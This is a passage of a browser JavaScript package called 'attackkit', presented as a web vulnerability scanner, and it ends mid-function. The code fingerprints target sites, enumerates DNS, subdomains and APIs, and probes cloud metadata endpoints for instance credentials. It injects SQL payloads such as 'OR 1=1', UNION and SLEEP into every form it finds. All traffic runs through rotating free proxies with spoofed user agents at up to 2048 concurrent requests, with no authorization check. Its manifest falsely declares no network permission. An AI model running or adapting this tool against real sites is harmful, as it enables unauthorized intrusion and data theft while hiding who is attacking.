(() => {
  'use strict';
  const PACKAGE_FILE_MANIFEST=Object.freeze({"name":"attackkit","version":"1.0.0","schema":1,"managed":true,"keys":{"storage":[],"cookies":[],"indexedDB":[],"cache":[],"globals":["__munitos_pkg_attackkit"]},"path":"pkg/attackkit/attackkit.js","manifestAuthority":"self"});
const PKG = 'attackkit';
  const VERSION = PACKAGE_FILE_MANIFEST.version;
  const GLOBAL_KEY = PACKAGE_FILE_MANIFEST.keys.globals[0];

  const PROFILES = Object.freeze({
    high: Object.freeze({ concurrent: 1024, minConcurrent: 512, maxConcurrent: 2048, label: 'HIGH-POWER' }),
    low: Object.freeze({ concurrent: 96, minConcurrent: 48, maxConcurrent: 384, label: 'LOW-POWER' })
  });

  const DEFAULTS = Object.freeze({
    timeout: 8000,
    probeTimeout: 5000,
    scanTimeout: 8000,
    retryBackoff: Object.freeze([400, 1000, 2000]),
    maxConcurrentRequests: 1024
  });

  const CACHE_TTL_MS = 120000;

  const manifest = Object.freeze({
    name: PKG,
    version: VERSION,
    description: 'AttackKit — high-speed web vulnerability scanner with baseline fingerprinting.',
    help: `${PKG} help`,
    official: false,
    default: false,
    securityLevel: 'high',
    permissions: Object.freeze({
      storage: 'none',
      cookies: 'none',
      network: 'none',
      filesystem: 'none'
    }),
    commands: Object.freeze([PKG]),
    dependencies: Object.freeze([]),
    entry: 'install'
  });

  const state = {
    api: null,
    settings: { ...DEFAULTS, retryBackoff: [...DEFAULTS.retryBackoff] },
    runtime: {
      visitedUrls: new Set(),
      baseline: null,
      stats: { phaseTimings: {}, totalTime: 0, fpFiltered: 0 },
      cache: new Map(),
      proxyList: [],
      customProxy: null,
      proxyReady: false,
      activeProfile: 'high'
    }
  };

  const ensureApi = () => {
    if (!state.api) throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    return state.api;
  };
  const L = (text, cls = 'output') => ensureApi().line(String(text ?? ''), cls);
  const SP = () => ensureApi().spacer();
  const fail = m => [L(m, 'danger')];
  const ok = m => [L(m, 'success')];
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  const applyProfile = name => {
    const p = PROFILES[name] || PROFILES.high;
    state.runtime.activeProfile = name;
    state.settings.maxConcurrentRequests = p.concurrent;
    state.settings.concurrencyMin = p.minConcurrent;
    state.settings.concurrencyMax = p.maxConcurrent;
    state.settings.timeout = name === 'low' ? 12000 : 8000;
    state.settings.probeTimeout = name === 'low' ? 7000 : 5000;
    state.settings.scanTimeout = name === 'low' ? 10000 : 8000;
    return p;
  };

  const hashText = s => {
    const str = String(s || '');
    let h = 5381;
    const lim = Math.min(str.length, 8192);
    for (let i = 0; i < lim; i++) h = ((h << 5) + h) ^ str.charCodeAt(i);
    return (h >>> 0).toString(16);
  };

  const NOT_FOUND_PATTERNS = [
    /<title>\s*404/i,
    /<title>[^<]*not[\s-]*found/i,
    /page[\s-]+not[\s-]+found/i,
    /the[\s-]+requested[\s-]+url[\s-]+was[\s-]+not[\s-]+found/i,
    /nothing[\s-]+here/i,
    /does[\s-]+not[\s-]+exist/i,
    /error[\s-]*404/i,
    /404[\s-]*not[\s-]*found/i,
    /resource[\s-]+not[\s-]+found/i,
    /<h1[^>]*>\s*404\s*<\/h1>/i,
    /<h2[^>]*>\s*404\s*<\/h2>/i
  ];
  const looksLikeErrorPage = text => {
    const lower = String(text || '').slice(0, 4096).toLowerCase();
    return NOT_FOUND_PATTERNS.some(re => re.test(lower));
  };

  const limitConcurrency = (tasks, limit) => new Promise(resolve => {
    const results = new Array(tasks.length);
    let index = 0, active = 0;
    const runNext = () => {
      while (active < limit && index < tasks.length) {
        const i = index++;
        active++;
        Promise.resolve()
          .then(() => tasks[i]())
          .then(r => { results[i] = r; active--; runNext(); })
          .catch(e => { results[i] = e; active--; runNext(); });
      }
      if (index >= tasks.length && active === 0) resolve(results);
    };
    runNext();
  });

  const runWithTimeout = async (url, options = {}) => {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(),
      Math.max(1000, Number(options.timeout) || state.settings.timeout));
    try {
      return await fetch(url, { ...options, signal: controller.signal, mode: 'cors' });
    } finally {
      clearTimeout(timer);
    }
  };

  const proxied = (template, url) => {
    if (!template || typeof template !== 'string' || !template.includes('{url}')) {
      throw new Error('Invalid proxy template');
    }
    return template.replace('{url}', encodeURIComponent(String(url)));
  };

  const isPublicHost = hostname => {
    if (!hostname) return false;
    if (['localhost', '127.0.0.1', '::1'].includes(hostname)) return false;
    if (/^10\./.test(hostname) || /^192\.168\./.test(hostname) || /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(hostname)) return false;
    if (hostname.endsWith('.local') || hostname.endsWith('.internal')) return false;
    return true;
  };

  function getFreeUserProxy() {
    try { return window.__FreeUserProxy || globalThis.__FreeUserProxy || null; } catch { return null; }
  }

  async function testCustomProxy(template, testUrl = 'https://httpbin.org/get') {
    try {
      const controller = new AbortController();
      const t = setTimeout(() => controller.abort(), 5000);
      const url = proxied(template, testUrl);
      const res = await fetch(url, { method: 'HEAD', signal: controller.signal, mode: 'cors' });
      clearTimeout(t);
      return res.ok;
    } catch { return false; }
  }

  async function prepareProxyList(forceRefresh = false) {
    if (!forceRefresh && state.runtime.proxyReady && state.runtime.proxyList.length > 0) {
      return state.runtime.proxyList;
    }
    const fup = getFreeUserProxy();
    if (!fup || typeof fup.getWorkingProxies !== 'function') {
      throw new Error('FreeUserProxy is not available. Ensure http://MUNITOS.github.io/FreeUserProxy.js is loaded.');
    }
    let working = [];
    try { working = fup.getWorkingProxies() || []; } catch { working = []; }
    if (!Array.isArray(working)) working = [];
    if (state.runtime.customProxy && state.runtime.customProxy.includes('{url}')) {
      const okCustom = await testCustomProxy(state.runtime.customProxy);
      if (okCustom && !working.some(p => p.template === state.runtime.customProxy)) {
        working.push({ name: 'custom', template: state.runtime.customProxy });
      }
    }
    if (working.length === 0) throw new Error('No working proxies available.');
    state.runtime.proxyList = working;
    state.runtime.proxyReady = true;
    return working;
  }

  let proxyIndex = 0;
  const getNextProxy = () => {
    if (state.runtime.proxyList.length === 0) throw new Error('No proxy available.');
    const p = state.runtime.proxyList[proxyIndex % state.runtime.proxyList.length];
    proxyIndex = (proxyIndex + 1) % state.runtime.proxyList.length;
    return p;
  };

  function getRandomUserAgent() {
    const fup = getFreeUserProxy();
    if (fup && typeof fup.getRandomUserAgent === 'function') {
      try { const ua = fup.getRandomUserAgent(); if (ua) return ua; } catch { }
    }
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';
  }

  async function fetchWithRetry(url, options = {}) {
    if (!url || typeof url !== 'string') throw new Error('Invalid URL');
    let proxies = state.runtime.proxyList;
    if (proxies.length === 0) proxies = await prepareProxyList();
    const finalOptions = {
      ...options,
      headers: { 'User-Agent': getRandomUserAgent(), ...(options.headers || {}) }
    };
    const cacheKey = url + (options.method || 'GET') + (options.body || '');
    if ((options.method || 'GET') === 'GET' && state.runtime.cache.has(cacheKey)) {
      const c = state.runtime.cache.get(cacheKey);
      if (Date.now() - c.timestamp < CACHE_TTL_MS) return c.response.clone();
      state.runtime.cache.delete(cacheKey);
    }
    const maxAttempts = Math.min(proxies.length, 3);
    let lastError = null;
    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      const proxy = proxies[attempt % proxies.length];
      try {
        const proxyUrl = proxied(proxy.template, url);
        const res = await runWithTimeout(proxyUrl, finalOptions);
        if (res.ok || res.status < 400) {
          if ((options.method || 'GET') === 'GET') {
            state.runtime.cache.set(cacheKey, { response: res.clone(), timestamp: Date.now() });
          }
          return res;
        }
        if (res.status === 429) {
          await sleep(state.settings.retryBackoff[attempt % state.settings.retryBackoff.length] || 1000);
        }
      } catch (err) { lastError = err; }
    }
    throw new Error(`Fetch failed for ${url}${lastError ? `: ${lastError.message}` : ''}`);
  }

  async function fetchText(url, options = {}) {
    const res = await fetchWithRetry(url, options);
    if (!res.ok && res.status >= 400) throw new Error(`HTTP ${res.status}`);
    return await res.text();
  }
  async function fetchJSON(url, options = {}) {
    const res = await fetchWithRetry(url, options);
    if (!res.ok && res.status >= 400) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  }
  async function fetchHeadersObj(url) {
    let res;
    try { res = await fetchWithRetry(url, { method: 'HEAD' }); }
    catch { res = await fetchWithRetry(url); }
    const headers = {};
    if (res && typeof res.headers.forEach === 'function') {
      res.headers.forEach((v, k) => { headers[k] = v; });
    }
    return headers;
  }

  const normalizeHeaders = headers => {
    const h = {};
    if (headers && typeof headers === 'object') {
      for (const [k, v] of Object.entries(headers)) h[String(k).toLowerCase()] = { key: k, value: v };
    }
    return h;
  };
  const headerValue = (headers, name) => headers[name.toLowerCase()]?.value || '';
  const hasHeader = (headers, name) => Object.prototype.hasOwnProperty.call(headers, name.toLowerCase());
  const findHeader = (headers, pattern) => {
    const regex = pattern instanceof RegExp ? pattern : new RegExp(`^${String(pattern).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
    return Object.keys(headers).find(k => regex.test(k));
  };

  const resolveUrl = (url, baseUrl) => { try { return new URL(url, baseUrl).href; } catch { return null; } };

  const normalizeTarget = rawUrl => {
    let n;
    try { n = new URL(rawUrl).href; }
    catch { n = `https://${rawUrl}`; try { new URL(n); } catch { throw new Error('Invalid URL'); } }
    if (!n.endsWith('/')) n += '/';
    return n;
  };

  // ============= Baseline fingerprinting =============
  async function buildBaseline(origin) {
    const u = new URL(origin);
    const base = `${u.protocol}//${u.host}`;
    const rand = `__attackkit_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
    const nfUrl = `${base}/${rand}`;
    const rootUrl = `${base}/`;
    const baseline = { notFoundHash: null, notFoundLen: null, rootHash: null, rootLen: null, corsReadable: false };
    const [nf, rt] = await Promise.all([
      fetchText(nfUrl, { timeout: state.settings.probeTimeout }).catch(() => ''),
      fetchText(rootUrl, { timeout: state.settings.probeTimeout }).catch(() => '')
    ]);
    if (nf) { baseline.notFoundHash = hashText(nf); baseline.notFoundLen = nf.length; baseline.corsReadable = true; }
    if (rt) { baseline.rootHash = hashText(rt); baseline.rootLen = rt.length; baseline.corsReadable = true; }
    return baseline;
  }

  const isMirror = (text, baseline) => {
    if (!baseline || !text) return false;
    const h = hashText(text), len = text.length;
    if (baseline.notFoundHash && h === baseline.notFoundHash && baseline.notFoundLen === len) return true;
    if (baseline.rootHash && h === baseline.rootHash && baseline.rootLen === len) return true;
    return false;
  };

  // ============= HTML parsing =============
  function parseHTML(html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const count = sel => doc.querySelectorAll(sel).length;
    const meta = name => doc.querySelector(`meta[name="${name}"]`)?.getAttribute('content') || '';
    const links = [...doc.querySelectorAll('a[href]')].map(a => a.href);
    const scripts = [...doc.querySelectorAll('script[src]')].map(s => s.src);
    const forms = [...doc.querySelectorAll('form')].map((form, idx) => ({
      id: `form-${idx}`,
      action: form.action || '',
      method: (form.method || 'GET').toUpperCase(),
      inputs: [...form.querySelectorAll('input, textarea, select')].map(inp => ({
        name: inp.name || '',
        type: inp.type || 'text',
        value: inp.value || '',
        id: inp.id || ''
      })),
      html: form.outerHTML
    }));
    return {
      title: doc.querySelector('title')?.textContent?.trim() || '(none)',
      metaGenerator: meta('generator'),
      lang: doc.documentElement.lang || '',
      headings: { h1: count('h1'), h2: count('h2'), h3: count('h3') },
      images: count('img'),
      links, scripts,
      inlineScripts: count('script:not([src])'),
      forms
    };
  }

  function detectTechnology(html, headers, docInfo) {
    const body = String(html || '').toLowerCase();
    const h = normalizeHeaders(headers);
    const found = new Map();
    const add = (cond, name, score = 1) => { if (cond) found.set(name, (found.get(name) || 0) + score); };
    add(hasHeader(h, 'server'), `Server: ${headerValue(h, 'server')}`, 2);
    add(hasHeader(h, 'x-powered-by'), `X-Powered-By: ${headerValue(h, 'x-powered-by')}`, 3);
    add(hasHeader(h, 'x-aspnet-version'), 'ASP.NET', 3);
    add(hasHeader(h, 'x-generator'), `Generator: ${headerValue(h, 'x-generator')}`, 3);
    const metaGen = (docInfo.metaGenerator || '').toLowerCase();
    const cmsMap = { 'wordpress': 'WordPress', 'joomla': 'Joomla', 'drupal': 'Drupal', 'magento': 'Magento', 'shopify': 'Shopify', 'wix': 'Wix', 'prestashop': 'PrestaShop', 'opencart': 'OpenCart', 'typo3': 'TYPO3', 'craftcms': 'Craft CMS', 'octobercms': 'October CMS' };
    for (const [k, n] of Object.entries(cmsMap)) add(metaGen.includes(k), n, 4);
    const bodyPatterns = [
      ['wp-content/themes/', 'WordPress', 4], ['wp-includes/', 'WordPress', 4], ['wp-json', 'WordPress REST API', 3],
      ['sites/default/files/', 'Drupal', 4], ['media/jui/', 'Joomla', 4], ['skin/frontend/', 'Magento', 4],
      ['cdn.shopify.com', 'Shopify', 4], ['static.wixstatic.com', 'Wix', 4], ['catalog/view/theme/', 'OpenCart', 4],
      ['typo3conf/', 'TYPO3', 4]
    ];
    for (const [pat, name, score] of bodyPatterns) add(body.includes(pat), name, score);
    const scriptSrc = (docInfo.scripts || []).join(' ').toLowerCase();
    const jsLibs = [
      ['jquery', 'jQuery', 2], ['react', 'React', 2], ['angular', 'Angular', 2], ['vue', 'Vue.js', 2],
      ['bootstrap', 'Bootstrap', 1], ['tailwindcss', 'Tailwind CSS', 1], ['next.js', 'Next.js', 3],
      ['alpinejs', 'Alpine.js', 1], ['svelte', 'Svelte', 2]
    ];
    for (const [pat, name, score] of jsLibs) {
      if (scriptSrc.includes(pat)) add(true, name, score * 2);
      else if (body.includes(pat)) add(true, name, score);
    }
    add(hasHeader(h, 'cf-ray'), 'Cloudflare', 5);
    add(hasHeader(h, 'x-amz-cf-id'), 'AWS CloudFront', 5);
    add(hasHeader(h, 'x-akamai-transformed'), 'Akamai', 5);
    add(hasHeader(h, 'x-vercel-cache'), 'Vercel', 5);
    add(hasHeader(h, 'x-netlify-request-id'), 'Netlify', 5);
    return [...found.entries()].filter(([, s]) => s >= 2).sort((a, b) => b[1] - a[1]).map(([n]) => n);
  }

  function detectWAF(headersObj, html) {
    const h = normalizeHeaders(headersObj);
    const body = String(html || '');
    const found = new Set();
    const add = (c, n) => { if (c) found.add(n); };
    add(hasHeader(h, 'cf-ray') || body.includes('cf-browser-verification'), 'Cloudflare');
    add(hasHeader(h, 'x-sucuri-id'), 'Sucuri');
    add(hasHeader(h, 'x-iinfo'), 'Imperva');
    add(hasHeader(h, 'x-amz-cf-id'), 'AWS WAF');
    add(hasHeader(h, 'x-akamai-transformed'), 'Akamai');
    add(findHeader(h, /^x-f5-/i), 'F5 BIG-IP');
    add(hasHeader(h, 'x-modsecurity'), 'ModSecurity');
    return found.size ? [...found] : ['None'];
  }

  function fingerprintCMS(tech) {
    return tech.filter(t => ['WordPress', 'Drupal', 'Joomla', 'Magento', 'Shopify', 'Wix', 'PrestaShop', 'OpenCart', 'TYPO3', 'Craft CMS', 'October CMS'].includes(t));
  }

  function classifyFormType(form) {
    const names = (form.inputs || []).map(i => `${i.name || ''} ${i.type || ''}`.toLowerCase());
    const c = names.join(' ');
    const a = (form.action || '').toLowerCase();
    if (c.includes('search') || c.includes('query') || a.includes('search')) return 'search';
    if (c.includes('login') || c.includes('password') || c.includes('username') || a.includes('login') || a.includes('signin')) return 'login';
    if (c.includes('comment') || c.includes('message') || a.includes('comment')) return 'comment';
    if (c.includes('upload') || c.includes('file') || a.includes('upload')) return 'upload';
    if (c.includes('contact') || a.includes('contact')) return 'contact';
    if (c.includes('register') || c.includes('signup') || a.includes('register')) return 'registration';
    if (form.method === 'POST' && (form.inputs || []).length > 0) return 'generic-post';
    return 'generic-get';
  }

  function classifyPurpose(html, forms, url) {
    const body = String(html).toLowerCase();
    const purposes = new Set();
    const hasFormType = t => forms.some(f => classifyFormType(f) === t);
    if (hasFormType('search')) purposes.add('search');
    if (hasFormType('login')) purposes.add('login-panel');
    if (hasFormType('comment')) purposes.add('comment-enabled');
    if (hasFormType('upload')) purposes.add('file-upload');
    if (hasFormType('contact')) purposes.add('contact');
    if (body.includes('add to cart') || body.includes('checkout') || body.includes('shop')) purposes.add('e-commerce');
    if (body.includes('blog') || body.includes('article')) purposes.add('blog');
    if (body.includes('api') || body.includes('endpoint')) purposes.add('api');
    if (purposes.size === 0) purposes.add('general');
    return [...purposes].sort();
  }

  function extractEndpoints(html, baseUrl) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const set = new Set();
    const staticExt = /\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|webm|mp3|pdf|zip|tar|gz|rar)$/i;
    const add = href => {
      if (!href) return;
      const r = resolveUrl(href, baseUrl);
      if (!r) return;
      try {
        const u = new URL(r);
        if (!['http:', 'https:'].includes(u.protocol)) return;
        if (!isPublicHost(u.hostname)) return;
        if (staticExt.test(u.pathname)) return;
        set.add(u.href);
      } catch { }
    };
    doc.querySelectorAll('a[href], script[src], form[action], link[href], iframe[src]').forEach(el => add(el.href || el.src || el.action));
    return [...set].sort();
  }

  function detectLanguage(headers, html) {
    const h = normalizeHeaders(headers);
    const xpb = headerValue(h, 'x-powered-by').toLowerCase();
    const server = headerValue(h, 'server').toLowerCase();
    const body = String(html).toLowerCase();
    const set = new Set();
    if (xpb.includes('php') || body.includes('.php')) set.add('PHP');
    if (xpb.includes('asp.net') || server.includes('iis')) set.add('ASP.NET');
    if (server.includes('express') || body.includes('__next')) set.add('Node.js');
    if (xpb.includes('python') || server.includes('django') || server.includes('flask')) set.add('Python');
    if (xpb.includes('java') || server.includes('tomcat')) set.add('Java');
    if (set.size === 0) set.add('unknown');
    return [...set].sort();
  }

  async function crawlJSFiles(html, baseUrl) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const srcs = [...doc.querySelectorAll('script[src]')].map(s => s.src).filter(Boolean);
    const tasks = srcs.map(src => async () => {
      const r = resolveUrl(src, baseUrl);
      if (!r) return null;
      try {
        const u = new URL(r);
        if (!isPublicHost(u.hostname)) return null;
        const content = await fetchText(r);
        return { url: r, content, fetched: true };
      } catch { return { url: r, content: null, fetched: false }; }
    });
    const results = (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
    doc.querySelectorAll('script:not([src])').forEach((s, i) => {
      const content = s.textContent || '';
      if (content.trim()) results.push({ url: `inline-${i}`, content, fetched: true });
    });
    return results;
  }

  async function crawlInternalLinks(startUrl, baseUrl, maxDepth = 2) {
    const visited = new Set(state.runtime.visitedUrls);
    const queue = [{ url: startUrl, depth: 0 }];
    const discovered = [];
    const targetOrigin = new URL(baseUrl).origin;
    while (queue.length > 0) {
      const batch = [];
      while (queue.length && batch.length < state.settings.maxConcurrentRequests) {
        const item = queue.shift();
        if (visited.has(item.url) || item.depth > maxDepth) continue;
        visited.add(item.url);
        state.runtime.visitedUrls.add(item.url);
        batch.push(item);
      }
      if (!batch.length) break;
      const tasks = batch.map(({ url, depth }) => async () => {
        try {
          const html = await fetchText(url);
          const doc = new DOMParser().parseFromString(html, 'text/html');
          const links = [...doc.querySelectorAll('a[href]')]
            .map(a => resolveUrl(a.href, url))
            .filter(l => {
              if (!l) return false;
              try { const u = new URL(l); return isPublicHost(u.hostname) && u.origin === targetOrigin; }
              catch { return false; }
            });
          return { url, depth, links };
        } catch { return null; }
      });
      const results = await Promise.all(tasks.map(t => t()));
      for (const r of results) {
        if (!r) continue;
        for (const link of r.links) {
          if (!visited.has(link)) {
            discovered.push(link);
            if (r.depth < maxDepth) queue.push({ url: link, depth: r.depth + 1 });
          }
        }
      }
    }
    return discovered;
  }

  async function dnsEnumeration(domain) {
    const results = { A: [], AAAA: [], MX: [], NS: [], CNAME: [], TXT: [], SOA: [], SRV: [], CAA: [], SPF: [], DMARC: [], DKIM: [], dnssec: false };
    const fetchDns = async (name, type) => {
      try {
        const url = `https://dns.google/resolve?name=${encodeURIComponent(name)}&type=${type}`;
        const data = await fetchJSON(url);
        return (data.Answer || []).map(r => ({ name: r.name, type: r.type, data: r.data, TTL: r.TTL }));
      } catch { return []; }
    };
    try {
      const [a, aaaa, mx, ns, cname, txt, soa, srv, caa] = await Promise.all([
        fetchDns(domain, 'A'), fetchDns(domain, 'AAAA'), fetchDns(domain, 'MX'),
        fetchDns(domain, 'NS'), fetchDns(domain, 'CNAME'), fetchDns(domain, 'TXT'),
        fetchDns(domain, 'SOA'), fetchDns(domain, 'SRV'), fetchDns(domain, 'CAA')
      ]);
      Object.assign(results, { A: a, AAAA: aaaa, MX: mx, NS: ns, CNAME: cname, TXT: txt, SOA: soa, SRV: srv, CAA: caa });
      for (const t of results.TXT) if (t.data && t.data.includes('v=spf1')) results.SPF.push(t.data);
      const dmarc = await fetchDns(`_dmarc.${domain}`, 'TXT');
      if (dmarc.length) results.DMARC = dmarc.map(r => r.data);
      const selectors = ['google', 'default', 'mail', 'selector1', 'selector2'];
      const dkimTasks = selectors.map(sel => async () => {
        const recs = await fetchDns(`${sel}._domainkey.${domain}`, 'TXT');
        return recs.length ? { selector: sel, records: recs.map(r => r.data) } : null;
      });
      results.DKIM = (await Promise.all(dkimTasks.map(t => t()))).filter(Boolean);
      const ds = await fetchDns(domain, 'DS');
      if (ds.length) results.dnssec = true;
      else { const k = await fetchDns(domain, 'DNSKEY'); if (k.length) results.dnssec = true; }
    } catch (e) { results.error = e.message; }
    return results;
  }

  async function subdomainEnumeration(domain) {
    const subs = new Set();
    try {
      const crt = await fetchJSON(`https://crt.sh/?q=%25.${domain}&output=json`);
      if (Array.isArray(crt)) for (const e of crt) {
        if (e.name_value) String(e.name_value).split('\n').forEach(n => { if (n && n.endsWith(domain)) subs.add(n.trim()); });
        if (e.common_name && e.common_name.endsWith(domain)) subs.add(e.common_name.trim());
      }
    } catch { }
    const common = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging', 'blog', 'shop', 'app', 'cdn', 'secure', 'vpn', 'm', 'mobile', 'support', 'docs', 'status', 'login'];
    const tasks = common.map(sub => async () => {
      const host = `${sub}.${domain}`;
      try {
        const d = await fetchJSON(`https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`);
        if (d.Answer && d.Answer.length > 0) return host;
      } catch { }
      return null;
    });
    const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
    for (const h of results) if (h) subs.add(h);
    return [...subs].sort();
  }

  async function cloudMetadataDetection() {
    const metadataUrls = {
      'AWS': 'http://169.254.169.254/latest/meta-data/',
      'GCP': 'http://metadata.google.internal/computeMetadata/v1/instance/',
      'Azure': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
    };
    const tasks = Object.entries(metadataUrls).map(([cloud, url]) => async () => {
      try {
        const res = await fetchWithRetry(url, { method: 'GET', headers: { 'Metadata-Flavor': 'Google' } });
        const text = await res.text();
        if (/instance-id|ami-id|security-credentials|computeMetadata|project-id/i.test(text)) {
          return { cloud, url, data: text.substring(0, 200) };
        }
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function apiDiscovery(baseUrl) {
    const results = { swagger: null, graphql: null, restEndpoints: [] };
    const swaggerPaths = ['/swagger-ui.html', '/swagger.json', '/openapi.json', '/v2/api-docs', '/v3/api-docs'];
    const swaggerTasks = swaggerPaths.map(path => async () => {
      try {
        const url = resolveUrl(path, baseUrl);
        if (!url) return null;
        const res = await fetchWithRetry(url);
        if (res.ok) {
          const text = await res.text();
          if (/swagger|openapi/i.test(text)) return { url };
        }
      } catch { }
      return null;
    });
    results.swagger = (await Promise.all(swaggerTasks.map(t => t()))).find(Boolean);
    try {
      const gqlUrl = resolveUrl('/graphql', baseUrl);
      if (gqlUrl) {
        const res = await fetchWithRetry(gqlUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: '{ __schema { types { name } } }' }) });
        if (res.ok) {
          const data = await res.json();
          if (data?.data?.__schema) results.graphql = { url: gqlUrl, introspection: true, types: data.data.__schema.types.length };
        }
      }
    } catch { }
    const restPaths = ['/api', '/api/v1', '/api/v2', '/rest', '/v1', '/v2'];
    const restTasks = restPaths.map(path => async () => {
      try {
        const url = resolveUrl(path, baseUrl);
        if (!url) return null;
        const res = await fetchWithRetry(url);
        if (res.ok) return url;
      } catch { }
      return null;
    });
    results.restEndpoints = (await Promise.all(restTasks.map(t => t()))).filter(Boolean);
    return results;
  }

  // ============= Profiling =============
  async function buildProfile(rawUrl) {
    const normalizedUrl = normalizeTarget(rawUrl);
    const domain = new URL(normalizedUrl).hostname;
    const origin = new URL(normalizedUrl).origin;
    let response, html, headersObj;
    try {
      response = await fetchWithRetry(normalizedUrl);
      html = await response.text();
      headersObj = {};
      if (response.headers?.forEach) response.headers.forEach((v, k) => { headersObj[k] = v; });
    } catch (e) { throw new Error(`Failed to fetch URL: ${e.message}`); }

    const baseline = await buildBaseline(origin);
    state.runtime.baseline = baseline;

    const docInfo = parseHTML(html);
    const forms = docInfo.forms.map(f => {
      if (f.action) {
        try {
          const au = new URL(f.action, normalizedUrl);
          if (!isPublicHost(au.hostname)) f.action = normalizedUrl;
          else f.action = au.href;
        } catch { f.action = normalizedUrl; }
      } else f.action = normalizedUrl;
      return f;
    });

    const technology = detectTechnology(html, headersObj, docInfo);
    const cms = fingerprintCMS(technology);
    const safe = async (fn, fb) => { try { return await fn(); } catch { return fb; } };

    const [purposes, endpoints, languages, waf, jsFiles, internalLinks, dns, subdomains, api] = await Promise.all([
      safe(() => Promise.resolve(classifyPurpose(html, forms, normalizedUrl)), []),
      safe(() => Promise.resolve(extractEndpoints(html, normalizedUrl)), []),
      safe(() => Promise.resolve(detectLanguage(headersObj, html)), []),
      safe(() => Promise.resolve(detectWAF(headersObj, html)), ['None']),
      safe(() => crawlJSFiles(html, normalizedUrl), []),
      safe(() => crawlInternalLinks(normalizedUrl, normalizedUrl, 1), []),
      safe(() => dnsEnumeration(domain), { A: [], SPF: [], DMARC: [], dnssec: false }),
      safe(() => subdomainEnumeration(domain), []),
      safe(() => apiDiscovery(normalizedUrl), { swagger: null, graphql: null, restEndpoints: [] })
    ]);

    return {
      target: { original: rawUrl, normalized: normalizedUrl, domain, status: response.status, responseUrl: response.url },
      html, headers: headersObj, technology, cms, purposes, endpoints, languages, waf,
      jsFiles, forms, internalLinks, dns, subdomains, api, baseline
    };
  }

  // ============= Vulnerability testers (XSS removed) =============
  const sqliPayloads = [
    "' OR '1'='1", "' OR '1'='1' -- -", '" OR "1"="1', "' OR 1=1 --", "' OR 'x'='x",
    "admin' --", "' UNION SELECT NULL--", "' AND SLEEP(5)--", "' AND 1=1--",
    "1 OR 1=1", "' OR 1=1#", "' UNION ALL SELECT NULL,NULL,NULL--"
  ];

  async function errorBased(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = (await res.text()).toLowerCase();
      return ['sql', 'syntax', 'mysql', 'mssql', 'oracle', 'odbc', 'database error', 'sqlite', 'postgres', 'unclosed quotation', 'sqlstate', 'pdo', 'mysqli'].some(p => text.includes(p));
    } catch { return false; }
  }
  async function booleanBased(targetUrl, form, payload) {
    try {
      const p1 = payload + ' AND 1=1';
      const p2 = payload + ' AND 1=2';
      const b1 = new URLSearchParams();
      const b2 = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) b1.set(i.name, i.value || p1); });
      (form.inputs || []).forEach(i => { if (i.name) b2.set(i.name, i.value || p2); });
      const [r1, r2] = await Promise.all([
        fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: b1.toString() }),
        fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: b2.toString() })
      ]);
      const t1 = await r1.text(), t2 = await r2.text();
      if (r1.status === r2.status && Math.abs(t1.length - t2.length) < 20) return false;
      if (isMirror(t1, state.runtime.baseline) || isMirror(t2, state.runtime.baseline)) return false;
      return Math.abs(t1.length - t2.length) > 40 || r1.status !== r2.status;
    } catch { return false; }
  }
  async function timeBased(targetUrl, form, payload) {
    try {
      const start = Date.now();
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      return (Date.now() - start) > 3000;
    } catch { return false; }
  }
  async function unionBased(targetUrl, form, payload) {
    try {
      const body = new URLSearchParams();
      (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
      const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
      const text = await res.text();
      if (isMirror(text, state.runtime.baseline)) return false;
      if (text.includes('NULL') && text.includes('UNION')) return true;
      return /[0-9]+\s+[0-9]+\s+[0-9]+/.test(text);
    } catch { return false; }
  }
  async function sqliTester(targetUrl, form) {
    const tasks = sqliPayloads.map(payload => async () => {
      if (payload.includes('SLEEP')) {
        if (await timeBased(targetUrl, form, payload)) return { type: 'time-based', payload };
      } else {
        const [err, bool, union] = await Promise.all([
          errorBased(targetUrl, form, payload),
          booleanBased(targetUrl, form, payload),
          unionBased(targetUrl, form, payload)
        ]);
        if (err) return { type: 'error-based', payload };
        if (bool) return { type: 'boolean-based', payload };
        if (union) return { type: 'union-based', payload };
      }
      return null;
    });
